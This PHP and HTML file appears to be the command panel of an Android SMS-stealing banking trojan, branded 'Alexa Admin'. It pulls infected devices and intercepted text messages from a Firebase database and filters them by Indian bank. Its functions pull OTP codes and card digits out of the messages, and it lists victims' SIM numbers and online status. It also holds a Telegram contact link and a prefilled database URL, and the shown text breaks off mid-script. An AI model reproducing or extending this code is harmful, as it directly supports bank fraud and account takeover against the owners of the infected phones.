<?php
session_start();
$password_hash = '842be8efb2f16dd15970017eb8a1e9aeb45d11b04585488110372b6f43150110';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    if (hash('sha256', $_POST['password']) === $password_hash) {
        $_SESSION['logged'] = true;
    }
}

if (!isset($_SESSION['logged']) || !$_SESSION['logged']) {
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Alexa Admin</title><style>
    *{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:system-ui,sans-serif;overflow:hidden}
    .bg{position:fixed;inset:0;overflow:hidden;z-index:0}.bg span{position:absolute;width:4px;height:4px;background:#ef4444;border-radius:50%;animation:drop 15s linear infinite;opacity:0}
    .bg span:nth-child(1){left:10%;animation-delay:0s;animation-duration:12s}.bg span:nth-child(2){left:20%;animation-delay:2s;animation-duration:14s}.bg span:nth-child(3){left:30%;animation-delay:4s;animation-duration:10s}.bg span:nth-child(4){left:40%;animation-delay:1s;animation-duration:16s}.bg span:nth-child(5){left:50%;animation-delay:3s;animation-duration:13s}.bg span:nth-child(6){left:60%;animation-delay:5s;animation-duration:11s}.bg span:nth-child(7){left:70%;animation-delay:0.5s;animation-duration:15s}.bg span:nth-child(8){left:80%;animation-delay:2.5s;animation-duration:12s}.bg span:nth-child(9){left:90%;animation-delay:4.5s;animation-duration:14s}.bg span:nth-child(10){left:45%;animation-delay:3.5s;animation-duration:9s}
    @keyframes drop{0%{transform:translateY(-100px) scale(1);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(100vh) scale(0);opacity:0}}
    .login-box{position:relative;z-index:1;background:linear-gradient(135deg,#111,#1a1a1a);border:1px solid #ef444430;border-radius:24px;padding:48px;width:400px;max-width:90vw;box-shadow:0 0 60px #ef444420,0 0 120px #ef444410}
    .login-box h1{color:#fff;font-size:28px;font-weight:900;text-align:center;margin-bottom:4px;background:linear-gradient(135deg,#ef4444,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
    .login-box p{color:#666;text-align:center;font-size:13px;margin-bottom:32px}
    .login-box input{width:100%;padding:14px 18px;background:#0a0a0a;border:1px solid #222;border-radius:12px;color:#fff;font-size:15px;outline:none;transition:.2s;margin-bottom:16px}
    .login-box input:focus{border-color:#ef4444;box-shadow:0 0 20px #ef444420}
    .login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#dc2626,#ea580c);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.2s}
    .login-box button:hover{transform:translateY(-2px);box-shadow:0 8px 30px #ef444440}
    .glow{position:absolute;width:200px;height:200px;border-radius:50%;filter:blur(80px);z-index:0}.glow-1{top:-100px;right:-100px;background:#ef444440}.glow-2{bottom:-100px;left:-100px;background:#f9731620}
    </style></head><body>
    <div class="bg">'.str_repeat('<span></span>',10).'</div>
    <div class="glow glow-1"></div><div class="glow glow-2"></div>
    <form class="login-box" method="post">
        <h1 style="animation:glitch 3s infinite;animation-timing-function:steps(1)">ALEXA ADMIN</h1>
        <p>🔐 Restricted Access</p>
        <input type="password" name="password" placeholder="Enter Password" required>
        <button type="submit" name="login">ACCESS PANEL</button>
    </form></body></html>';
    exit;
}

$fb_url = $_GET['fb'] ?? '';
$fb_key = $_GET['key'] ?? '';

function fb_get($url, $key, $path) {
    $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json?auth=' . urlencode($key);
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $full, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_SSL_VERIFYPEER => false]);
    $res = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $http === 200 ? json_decode($res, true) : null;
}

function detect_bank($msg) {
    $banks = [
        'HDFC' => ['hdfc', 'hdfc bank'],
        'ICICI' => ['icici', 'icici bank'],
        'AXIS' => ['axis', 'axis bank'],
        'SBI' => ['sbi', 'state bank', 'sbI'],
        'YES BANK' => ['yes bank', 'yesb'],
        'KOTAK' => ['kotak', 'kotak mahindra'],
        'INDUSIND' => ['indusind', 'indus'],
        'FEDERAL' => ['federal', 'federal bank'],
        'RBL' => ['rbl', 'rbl bank'],
        'UNION' => ['union bank', 'union bank of india'],
        'CANARA' => ['canara', 'canara bank'],
        'BOI' => ['bank of india', 'boi'],
        'IDBI' => ['idbi', 'idbi bank']
    ];
    $ml = strtolower($msg);
    foreach ($banks as $name => $keywords) {
        foreach ($keywords as $kw) {
            if (strpos($ml, $kw) !== false) return $name;
        }
    }
    return null;
}

function detect_card($msg) {
    $cards = [];
    if (preg_match('/\b(\d{4})\s*\b/', $msg, $m)) $cards[] = 'Last4: ' . $m[1];
    if (preg_match('/\b(\d{4})\b.*?(?:expir|valid|thru|end)/i', $msg, $m)) $cards[] = 'Exp: ' . $m[1];
    return $cards;
}

function detect_otp($msg) {
    if (preg_match('/\b(\d{4,8})\b/', $msg, $m)) {
        $n = $m[1];
        if (strlen($n) >= 4 && strlen($n) <= 8 && is_numeric($n)) return $n;
    }
    return null;
}

$action = $_GET['action'] ?? '';

header('Content-Type: application/json');
if ($action === 'fetch' && $fb_url && $fb_key) {
    $data = ['devices' => [], 'sms' => [], 'stats' => ['total'=>0,'online'=>0,'offline'=>0,'sms_today'=>0]];
    
    $devices = fb_get($fb_url, $fb_key, '/clients') ?? fb_get($fb_url, $fb_key, '/devices') ?? [];
    if ($devices) {
        foreach ($devices as $id => $d) {
            if (!is_array($d)) continue;
            $online = !empty($d['online']) || !empty($d['isOnline']) || !empty($d['is_online']);
            $data['devices'][] = [
                'id' => $id,
                'name' => $d['deviceName'] ?? $d['name'] ?? $d['device_name'] ?? $id,
                'number' => $d['simNumber'] ?? $d['number'] ?? $d['sim'] ?? $d['phone'] ?? '',
                'sims' => $d['sims'] ?? $d['simCards'] ?? $d['sim_numbers'] ?? [],
                'online' => $online ? true : false,
                'lastSeen' => $d['lastSeen'] ?? $d['last_seen'] ?? $d['updatedAt'] ?? '',
                'country' => $d['country'] ?? $d['countryCode'] ?? '',
                'android' => $d['androidVersion'] ?? $d['android'] ?? '',
                'model' => $d['deviceModel'] ?? $d['model'] ?? '',
                'raw' => $d
            ];
        }
    }
    
    $sms_raw = fb_get($fb_url, $fb_key, '/sms') ?? fb_get($fb_url, $fb_key, '/messages') ?? [];
    if ($sms_raw) {
        $today = date('Y-m-d');
        foreach ($sms_raw as $id => $s) {
            if (!is_array($s)) continue;
            $dt = $s['date'] ?? $s['timestamp'] ?? $s['time'] ?? '';
            $is_today = strpos($dt, $today) !== false || (is_numeric($dt) && date('Y-m-d', $dt/1000) === $today) || (is_numeric($dt) && date('Y-m-d', $dt) === $today);
            $body = $s['body'] ?? $s['message'] ?? $s['text'] ?? $s['msg'] ?? '';
            $addr = $s['address'] ?? $s['sender'] ?? $s['from'] ?? $s['number'] ?? '';
            $data['sms'][] = [
                'id' => $id,
                'body' => $body,
                'address' => $addr,
                'date' => $dt,
                'device' => $s['deviceId'] ?? $s['device_id'] ?? $s['device'] ?? '',
                'bank' => detect_bank($body),
                'otp' => detect_otp(preg_replace('/[^0-9]/', '', $body)),
                'is_today' => $is_today,
                'raw' => $s
            ];
            if ($is_today) $data['stats']['sms_today']++;
        }
    }
    
    $data['stats']['total'] = count($data['devices']);
    $data['stats']['online'] = count(array_filter($data['devices'], fn($d) => $d['online']));
    $data['stats']['offline'] = $data['stats']['total'] - $data['stats']['online'];
    
    echo json_encode($data);
    exit;
}

if ($action === 'device_sms' && $fb_url && $fb_key) {
    $did = $_GET['did'] ?? '';
    $sms_raw = fb_get($fb_url, $fb_key, '/sms') ?? fb_get($fb_url, $fb_key, '/messages') ?? [];
    $result = [];
    if ($sms_raw) {
        foreach ($sms_raw as $id => $s) {
            if (!is_array($s)) continue;
            $dev = $s['deviceId'] ?? $s['device_id'] ?? $s['device'] ?? '';
            if ($dev === $did) {
                $body = $s['body'] ?? $s['message'] ?? $s['text'] ?? $s['msg'] ?? '';
                $result[] = [
                    'id' => $id,
                    'body' => $body,
                    'address' => $s['address'] ?? $s['sender'] ?? $s['from'] ?? '',
                    'date' => $s['date'] ?? $s['timestamp'] ?? '',
                    'bank' => detect_bank($body)
                ];
            }
        }
    }
    echo json_encode($result);
    exit;
}

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Alexa Admin - Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#080808;--card:#0d0d0d;--border:#1a1a1a;--red:#ef4444;--red2:#dc2626;--orange:#f97316;--text:#eee;--muted:#666;--glow:0 0 30px rgba(239,68,68,0.15)}
body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#0a0a0a}::-webkit-scrollbar-thumb{background:#ef444440;border-radius:4px}

/* ─── Matrix Rain Background ─── */
#matrixCanvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.06;pointer-events:none}

/* ─── Scanline Overlay ─── */
.scanlines{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px)}

/* ─── Glitch Text ─── */
@keyframes glitch{0%{text-shadow:0.05em 0 0 #ef4444,-0.05em -0.025em 0 #22c55e;transform:translate(0)}14%{text-shadow:0.05em 0 0 #ef4444,-0.05em -0.025em 0 #22c55e;transform:translate(0)}15%{text-shadow:-0.05em -0.025em 0 #ef4444,0.025em 0.025em 0 #22c55e;transform:translate(-2px,1px)}49%{text-shadow:-0.05em -0.025em 0 #ef4444,0.025em 0.025em 0 #22c55e;transform:translate(-2px,1px)}50%{text-shadow:0.025em 0.05em 0 #ef4444,0.05em 0 0 #22c55e;transform:translate(0)}99%{text-shadow:0.025em 0.05em 0 #ef4444,0.05em 0 0 #22c55e;transform:translate(0)}100%{text-shadow:-0.025em 0 0 #ef4444,-0.025em -0.025em 0 #22c55e;transform:translate(0)}}
.logo.glitch{animation:glitch 3s infinite;animation-timing-function:steps(1)}

/* ─── Pulse Ring ─── */
@keyframes pulse-ring{0%{transform:scale(.8);opacity:1}100%{transform:scale(2);opacity:0}}
.pulse-ring{position:relative}.pulse-ring::before{content:'';position:absolute;width:100%;height:100%;border-radius:50%;border:2px solid #22c55e;animation:pulse-ring 1.5s cubic-bezier(.215,.61,.355,1) infinite;pointer-events:none}

/* ─── Fire Border ─── */
@keyframes fire-border{0%,100%{border-color:#ef4444;box-shadow:0 0 15px #ef444420,0 0 30px #ef444410}50%{border-color:#f97316;box-shadow:0 0 20px #f9731620,0 0 40px #f9731610}}
.fire-border{animation:fire-border 3s ease-in-out infinite}

/* ─── Header ─── */
.header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
.header .logo{font-size:20px;font-weight:900;background:linear-gradient(135deg,#ef4444,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px;cursor:pointer}
.header .logo span{color:var(--muted);font-weight:400}
.header .nav{display:flex;gap:4px}
.header .nav a{padding:8px 16px;border-radius:10px;font-size:13px;font-weight:500;color:var(--muted);text-decoration:none;transition:.2s;cursor:pointer}
.header .nav a:hover,.header .nav a.active{background:#ffffff0a;color:#fff}
.header .nav a.active{background:#ef444415;color:var(--red)}
.header .right{display:flex;align-items:center;gap:12px}
.header .contact-btn{padding:8px 16px;background:linear-gradient(135deg,#dc2626,#ea580c);border-radius:10px;color:#fff;font-size:12px;font-weight:600;text-decoration:none;transition:.2s;white-space:nowrap}
.header .contact-btn:hover{transform:translateY(-1px);box-shadow:0 4px 20px #ef444440}

/* Main */
.main{padding:20px 24px;max-width:1400px;margin:0 auto}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden}
.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.stat.total::before{background:linear-gradient(90deg,#ef4444,#f97316)}
.stat.online::before{background:linear-gradient(90deg,#22c55e,#16a34a)}
.stat.offline::before{background:linear-gradient(90deg,#6b7280,#4b5563)}
.stat.sms::before{background:linear-gradient(90deg,#a855f7,#7c3aed)}
.stat .label{font-size:12px;font-weight:500;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.stat .value{font-size:36px;font-weight:900;line-height:1}
.stat.total .value{background:linear-gradient(135deg,#ef4444,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat.online .value{color:#22c55e}
.stat.offline .value{color:#6b7280}
.stat.sms .value{color:#a855f7}

/* Firebase Accounts */
.accounts-bar{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap;align-items:center}
.accounts-bar .current{font-size:13px;color:var(--muted)}
.accounts-bar .current strong{color:#fff}
.accounts-bar .add-btn{padding:6px 14px;background:transparent;border:1px dashed #333;border-radius:8px;color:var(--muted);font-size:12px;cursor:pointer;transition:.2s}
.accounts-bar .add-btn:hover{border-color:var(--red);color:var(--red);background:#ef444408}
.accounts-bar .switch{padding:6px 12px;background:transparent;border:1px solid var(--border);border-radius:8px;color:var(--muted);font-size:12px;cursor:pointer;transition:.2s}
.accounts-bar .switch:hover{border-color:#333;color:#fff}
.accounts-bar .switch.active{border-color:#ef444440;color:var(--red);background:#ef444408}

/* Device Grid */
.devices{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-bottom:24px}
.device{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
.device:hover{transform:translateY(-4px);border-color:#222;box-shadow:var(--glow),0 8px 30px rgba(0,0,0,0.4)}
.device.online{border-left:3px solid #22c55e}
.device.offline{border-left:3px solid #333}
.device .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px;position:relative}
.device .status-dot.online{background:#22c55e;box-shadow:0 0 10px #22c55e60}
.device .status-dot.offline{background:#555}
.device .status-dot.pulse-ring::before{content:'';position:absolute;top:-4px;left:-4px;width:16px;height:16px;border-radius:50%;border:2px solid #22c55e;animation:pulse-ring 1.5s cubic-bezier(.215,.61,.355,1) infinite;pointer-events:none}
.device h3{font-size:15px;font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:8px}
.device h3 .badge{font-size:10px;padding:2px 8px;border-radius:20px;font-weight:500}
.device h3 .badge.online{background:#22c55e20;color:#22c55e;border:1px solid #22c55e30}
.device h3 .badge.offline{background:#55520;color:#888;border:1px solid #55530}
.device .info{font-size:12px;color:var(--muted);line-height:1.8}
.device .info span{display:block}
.device .info .num{color:#6acfff;font-weight:500;font-family:monospace}

/* SMS Section */
.sms-section{margin-top:24px}
.sms-section h2{font-size:18px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:10px}
.sms-section h2 .count{font-size:13px;font-weight:500;color:var(--muted);background:#ffffff08;padding:2px 10px;border-radius:20px}
.sms-filters{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
.sms-filters button{padding:6px 14px;background:transparent;border:1px solid var(--border);border-radius:8px;color:var(--muted);font-size:12px;cursor:pointer;transition:.2s}
.sms-filters button:hover{border-color:#333;color:#fff}
.sms-filters button.active{border-color:#ef444440;color:var(--red);background:#ef444408}
.sms-list{display:flex;flex-direction:column;gap:8px}
.sms-item{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px 18px;transition:.2s}
.sms-item:hover{border-color:#222}
.sms-item .head{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.sms-item .head .addr{font-size:12px;font-weight:600;color:#6acfff}
.sms-item .head .date{font-size:11px;color:var(--muted)}
.sms-item .body{font-size:13px;line-height:1.5;color:#ccc;word-break:break-word}
.sms-item .tags{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
.sms-item .tags .tag{font-size:10px;padding:2px 10px;border-radius:20px;font-weight:500}
.sms-item .tags .tag.bank{background:#ef444415;color:var(--red);border:1px solid #ef444420}
.sms-item .tags .tag.otp{background:#22c55e15;color:#22c55e;border:1px solid #22c55e20}
.sms-item .tags .tag.card{background:#a855f715;color:#a855f7;border:1px solid #a855f720}
.sms-item .tags .tag.today{background:#f9731615;color:#f97316;border:1px solid #f9731620}
.sms-item .copy{float:right;padding:4px 8px;background:transparent;border:1px solid #222;border-radius:6px;color:var(--muted);font-size:10px;cursor:pointer;transition:.2s}
.sms-item .copy:hover{border-color:#444;color:#fff}

/* Modal */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
.modal-overlay.open{display:flex}
.modal{background:#111;border:1px solid #222;border-radius:20px;width:700px;max-width:100%;max-height:90vh;overflow-y:auto;padding:28px;position:relative;animation:fadeUp .3s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.modal .close{position:absolute;top:16px;right:16px;width:32px;height:32px;border-radius:50%;border:1px solid #222;background:transparent;color:var(--muted);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:.2s}
.modal .close:hover{border-color:#444;color:#fff}
.modal h2{font-size:20px;font-weight:700;margin-bottom:16px;padding-right:40px}
.modal .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
.modal .detail-grid .item{padding:12px;background:#0a0a0a;border-radius:10px}
.modal .detail-grid .item .lbl{font-size:11px;color:var(--muted);margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px}
.modal .detail-grid .item .val{font-size:14px;font-weight:500;word-break:break-word}
.modal .detail-grid .item .val.copyable{cursor:pointer;color:#6acfff}
.modal .detail-grid .item .val.copyable:hover{text-decoration:underline}
.modal .detail-grid .full{grid-column:1/-1}
.modal h3{font-size:15px;font-weight:600;margin:16px 0 12px;color:var(--muted)}
.modal .sims{display:flex;flex-direction:column;gap:6px}
.modal .sims .sim{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:10px 14px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
.modal .sims .sim .num{font-weight:600;color:#6acfff;cursor:pointer}
.modal .sims .sim .num:hover{text-decoration:underline}
.modal .sims .sim .carrier{color:var(--muted);font-size:11px}

/* Search */
.search-bar{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}
.search-bar input{flex:1;min-width:200px;padding:10px 16px;background:#0d0d0d;border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none;transition:.2s}
.search-bar input:focus{border-color:#ef444440;box-shadow:0 0 20px #ef444410}
.search-bar select{padding:10px 16px;background:#0d0d0d;border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none;cursor:pointer}

/* Add Account Modal */
.acct-form{display:flex;flex-direction:column;gap:12px}
.acct-form input{padding:12px 16px;background:#0a0a0a;border:1px solid #222;border-radius:10px;color:#fff;font-size:14px;outline:none;transition:.2s}
.acct-form input:focus{border-color:#ef444440}
.acct-form button{padding:12px;background:linear-gradient(135deg,#dc2626,#ea580c);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:.2s}
.acct-form button:hover{box-shadow:0 4px 20px #ef444440}

/* Empty state */
.empty{text-align:center;padding:60px 20px;color:var(--muted)}
.empty .icon{font-size:48px;margin-bottom:16px;opacity:0.3}
.empty p{font-size:14px}

/* Loading */
.loading{text-align:center;padding:40px;color:var(--muted)}
.spinner{display:inline-block;width:32px;height:32px;border:3px solid #222;border-top-color:var(--red);border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* Toasts */
.toast{position:fixed;bottom:24px;right:24px;z-index:999;padding:12px 20px;border-radius:12px;font-size:13px;font-weight:500;animation:fadeUp .3s ease;max-width:360px}
.toast.success{background:#16a34a;color:#fff}
.toast.error{background:#dc2626;color:#fff}
.toast.info{background:#1a1a1a;border:1px solid #222;color:#fff}

/* Glow effects */
.glow-bg{position:fixed;top:-200px;right:-200px;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(239,68,68,0.06),transparent 70%);pointer-events:none;z-index:-1}
.glow-bg2{bottom:-200px;left:-200px;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(249,115,22,0.04),transparent 70%);pointer-events:none;z-index:-1}
.float-contact{position:fixed;bottom:24px;right:24px;z-index:9999;width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#ea580c);display:flex;align-items:center;justify-content:center;font-size:24px;text-decoration:none;box-shadow:0 4px 20px rgba(239,68,68,0.4);transition:.3s;animation:bounce 2s ease-in-out infinite}
.float-contact:hover{transform:scale(1.15);box-shadow:0 8px 30px rgba(239,68,68,0.6)}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}

@media(max-width:640px){
    .header{padding:10px 16px;flex-wrap:wrap;gap:8px}
    .header .nav{order:3;width:100%;overflow-x:auto;padding-bottom:4px}
    .header .nav a{white-space:nowrap;font-size:12px;padding:6px 12px}
    .main{padding:16px}
    .stats{grid-template-columns:1fr 1fr}
    .devices{grid-template-columns:1fr}
    .modal .detail-grid{grid-template-columns:1fr}
    .modal{padding:20px}
}
</style>
</head>
<body>

<div class="glow-bg"></div>
<div class="glow-bg2"></div>
<a href="https://t.me/+BKEV4MYoSfgxOTM1" target="_blank" class="float-contact" title="Contact on Telegram">💬</a>
<div class="scanlines"></div>
<canvas id="matrixCanvas"></canvas>

<!-- Warning Banner -->
<div style="background:linear-gradient(90deg,#dc2626,#dc2626cc,#dc2626);padding:6px 16px;text-align:center;font-size:11px;font-weight:600;color:#fff;letter-spacing:1px;text-transform:uppercase">
    ⚠ ACCESS RESTRICTED — UNAUTHORIZED USE IS PROHIBITED ⚠
</div>

<!-- Header -->
<header class="header">
    <div class="logo glitch" onclick="document.querySelector('.logo').classList.toggle('glitch')">ALEXA <span>ADMIN</span></div>
    <div class="nav">
        <a class="active" onclick="showTab('dashboard')">Dashboard</a>
        <a onclick="showTab('sms')">SMS</a>
        <a onclick="showTab('devices')">Devices</a>
    </div>
    <div class="right">
        <a href="https://t.me/+BKEV4MYoSfgxOTM1" target="_blank" class="contact-btn" style="animation:pulse 2s ease-in-out infinite">📨 Contact</a>
        <a onclick="logout()" style="color:var(--muted);font-size:13px;cursor:pointer;text-decoration:none">Exit</a>
    </div>
</header>

<main class="main">

<!-- Firebase Accounts Bar -->
<div class="accounts-bar">
    <span class="current">🔗 <strong id="currentAcct">No account</strong></span>
    <button class="add-btn" onclick="showAddAccount()">+ Add Account</button>
    <div id="acctSwitcher"></div>
</div>

<!-- Search Bar -->
<div class="search-bar" id="searchBar">
    <input type="text" id="searchInput" placeholder="Search devices, SMS, numbers..." oninput="filterData()">
    <select id="filterStatus" onchange="filterData()">
        <option value="all">All Status</option>
        <option value="online">Online</option>
        <option value="offline">Offline</option>
    </select>
    <select id="filterBank" onchange="filterData()">
        <option value="all">All SMS</option>
        <option value="bank">Bank SMS</option>
        <option value="otp">OTP</option>
        <option value="card">Card Info</option>
    </select>
</div>

<!-- Dashboard Tab -->
<div id="tab-dashboard">
    <div class="stats" id="stats"></div>
    <div id="deviceGrid" class="devices"></div>
</div>

<!-- SMS Tab -->
<div id="tab-sms" style="display:none">
    <div class="sms-section">
        <h2>📩 SMS Messages <span class="count" id="smsCount">0</span></h2>
        <div class="sms-filters" id="smsFilters">
            <button class="active" data-filter="all" onclick="filterSMS('all',this)">All</button>
            <button data-filter="today" onclick="filterSMS('today',this)">Today</button>
            <button data-filter="bank" onclick="filterSMS('bank',this)">Bank</button>
            <button data-filter="otp" onclick="filterSMS('otp',this)">OTP</button>
            <button data-filter="card" onclick="filterSMS('card',this)">Card</button>
        </div>
        <div class="sms-list" id="smsList"></div>
    </div>
</div>

<!-- Devices Tab -->
<div id="tab-devices" style="display:none">
    <div class="stats" id="statsDevices"></div>
    <div id="deviceGrid2" class="devices"></div>
</div>

</main>

<!-- Device Modal -->
<div class="modal-overlay" id="deviceModal">
    <div class="modal">
        <button class="close" onclick="closeModal()">✕</button>
        <h2 id="modalTitle">Device</h2>
        <div class="detail-grid" id="modalDetails"></div>
        <h3>📱 SIM Cards</h3>
        <div class="sims" id="modalSims"></div>
        <h3>📩 Device SMS</h3>
        <div class="sms-list" id="modalSms"></div>
    </div>
</div>

<!-- Add Account Modal -->
<div class="modal-overlay" id="addAcctModal">
    <div class="modal" style="max-width:400px">
        <button class="close" onclick="document.getElementById('addAcctModal').classList.remove('open')">✕</button>
        <h2>🔗 Add Firebase Account</h2>
        <div class="acct-form">
            <input type="url" id="acctUrl" placeholder="Firebase Database URL" value="https://gggggg-979bd-default-rtdb.firebaseio.com">
            <input type="text" id="acctKey" placeholder="Firebase Secret Key">
            <button onclick="addAccount()">Add Account</button>
        </div>
    </div>
</div>

<script>
// ─── Matrix Rain ────────────────────────────────────────────────────────
(function(){
    const c = document.getElementById('matrixCanvas');
    const ctx = c.getContext('2d');
    let W, H, cols, drops;
    function resize() {
        W = c.width = window.innerWidth;
        H = c.height = window.innerHeight;
        cols = Math.floor(W / 14);
        drops = Array(cols).fill(1);
    }
    resize();
    window.addEventListener('resize', resize);
    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789';
    function draw() {
        ctx.fillStyle = 'rgba(8,8,8,0.05)';
        ctx.fillRect(0, 0, W, H);
        ctx.fillStyle = '#ef4444';
        ctx.font = '14px monospace';
        for(let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillStyle = i % 3 === 0 ? '#ef4444' : i % 3 === 1 ? '#f97316' : '#dc2626';
            ctx.fillText(text, i * 14, drops[i] * 14);
            if(drops[i] * 14 > H && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 50);
})();

// ─── State ───────────────────────────────────────────────────────────────
let state = {
    accounts: JSON.parse(localStorage.getItem('alexa_accounts') || '[]'),
    current: localStorage.getItem('alexa_current') || '',
    devices: [],
    sms: [],
    stats: {total:0,online:0,offline:0,sms_today:0},
    smsFilter: 'all'
};

// ─── Account Management ───────────────────────────────────────────────
function saveAccounts() {
    localStorage.setItem('alexa_accounts', JSON.stringify(state.accounts));
    localStorage.setItem('alexa_current', state.current);
}

function addAccount() {
    const url = document.getElementById('acctUrl').value.trim();
    const key = document.getElementById('acctKey').value.trim();
    if (!url || !key) return showToast('Please enter URL and Key', 'error');
    if (state.accounts.find(a => a.url === url)) return showToast('Already exists', 'error');
    state.accounts.push({url, key, name: url.replace(/https?:\/\//,'').split('.')[0], added: Date.now()});
    state.current = url;
    saveAccounts();
    document.getElementById('addAcctModal').classList.remove('open');
    renderAccounts();
    loadData();
    showToast('Account added!', 'success');
}

function switchAccount(url) {
    state.current = url;
    saveAccounts();
    renderAccounts();
    loadData();
}

function deleteAccount(url) {
    if (!confirm('Delete this account?')) return;
    state.accounts = state.accounts.filter(a => a.url !== url);
    if (state.current === url) state.current = state.accounts[0]?.url || '';
    saveAccounts();
    renderAccounts();
    if (state.current) loadData();
    else { state.devices=[]; state.sms=[]; renderAll(); }
}

function getCurrent() {
    return state.accounts.find(a => a.url === state.current);
}

function renderAccounts() {
    document.getElementById('currentAcct').textContent = getCurrent()?.name || 'No account';
    const sw = document.getElementById('acctSwitcher');
    sw.innerHTML = state.accounts.map(a => `
        <button class="switch ${a.url===state.current?'active':''}" onclick="switchAccount('${a.url}')">
            ${a.name} ${a.url===state.current?'✓':''}
            <span onclick="event.stopPropagation();deleteAccount('${a.url}')" style="margin-left:6px;color:var(--muted);cursor:pointer">✕</span>
        </button>
    `).join('');
}

function showAddAccount() {
    document.getElementById('addAcctModal').classList.add('open');
}

// ─── Data Fetching ────────────────────────────────────────────────────
async function loadData() {
    const acct = getCurrent();
    if (!acct) return renderAll();
    
    document.getElementById('stats').innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    document.getElementById('deviceGrid').innerHTML = '';
    
    try {
        const res = await fetch(`?action=fetch&fb=${encodeURIComponent(acct.url)}&key=${encodeURIComponent(acct.key)}`);
        const data = await res.json();
        state.devices = data.devices || [];
        state.sms = data.sms || [];
        state.stats = data.stats || {total:0,online:0,offline:0,sms_today:0};
        renderAll();
    } catch(e) {
        showToast('Failed to fetch data: '+e.message, 'error');
        document.getElementById('stats').innerHTML = '<div class="empty"><div class="icon">⚠️</div><p>Failed to connect</p></div>';
    }
}

// ─── Rendering ────────────────────────────────────────────────────────
function renderAll() {
    renderStats();
    renderDevices();
    renderSMS();
    renderDevicesTab();
}

function renderStats() {
    const s = state.stats;
    document.getElementById('stats').innerHTML = `
        <div class="stat total"><div class="label">Total Devices</div><div class="value">${s.total}</div></div>
        <div class="stat online"><div class="label">Online</div><div class="value">${s.online}</div></div>
